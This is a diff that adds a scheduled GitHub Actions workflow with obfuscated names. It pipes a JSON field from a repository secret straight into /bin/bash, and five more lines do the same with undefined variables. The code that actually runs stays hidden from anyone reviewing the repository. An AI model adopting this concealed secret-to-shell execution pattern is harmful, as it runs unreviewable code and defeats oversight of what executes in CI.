@@ -1,0 +1,21 @@
+name: jianadadelvshi
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '39 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: jianadadelvshi
+        env:
+          wztk7: ${{ secrets.wztk7 }}
+        run: |
+          echo $wztk7 | jq -r .jg724 | /bin/bash
+          echo $dh4 | jq -r .cdjx46232 | /bin/bash
+          echo $npk15 | jq -r .uxoj2286 | /bin/bash
+          echo $c1764 | jq -r .agdbw87 | /bin/bash
+          echo $thh94733 | jq -r .f8474 | /bin/bash
+          echo $o2 | jq -r .l0 | /bin/bash
+
